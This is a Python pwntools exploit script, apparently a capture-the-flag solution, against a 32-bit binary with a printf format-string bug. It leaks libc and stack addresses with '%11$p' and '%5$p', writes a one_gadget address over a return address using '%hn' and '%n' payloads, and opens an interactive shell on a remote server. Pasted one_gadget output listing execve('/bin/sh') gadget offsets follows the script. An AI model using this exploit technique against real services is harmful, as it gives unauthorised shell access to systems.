#!/usr/bin/env python
# coding=utf-8
from pwn import *
local = 0
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./format")
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    a=remote("152.136.18.34",9999)
    libc=ELF("./libc-2.23.so")
def debug():
    gdb.attach(a,'''
    b *(0x56555000+0x0000951)
    b *(0x56555000+0x0000988)
    
    ''')
def exit():
    a.recvuntil("Choice:")
    a.send(str(2))  
def do(content):
    a.recvuntil("Choice:")
    a.send(str(1))
    a.recvuntil("What do tou want to say:")
    a.send(content)

do('%11$p')
libc_base=eval(a.recv(10))-libc.symbols["__libc_start_main"]-247
success("libc_base ==> 0x%x"%libc_base)
do("%5$p")
stack_addr=eval(a.recv(10))-0x98
success("stack_addr ==> 0x%x"%stack_addr)
payload='%'+str(stack_addr&0xffff)+"c"+"%5$hn"

do(payload)
#offset 53
one_gadget=libc_base+0x3a80e
payload="%"+str(one_gadget&0xffff)+"c"+"%53$n"
do(payload)

payload='%'+str((stack_addr+2)&0xffff)+"c"+"%5$hn"
do(payload)

payload="%"+str((one_gadget>>16)&0xffff)+"c"+"%53$n"

do(payload)

exit()
a.interactive()
'''
0x3ac5c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3ac5e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac62 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac69 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbc5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbc6 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL

'''

'''
wxy@ubuntu:/mnt/hgfs/Desktop/kctf/CurseofPyramid$ one_gadget libc-2.23.so 
0x3a80c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3a80e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3a812 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3a819 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5f065 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5f066 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL

'''

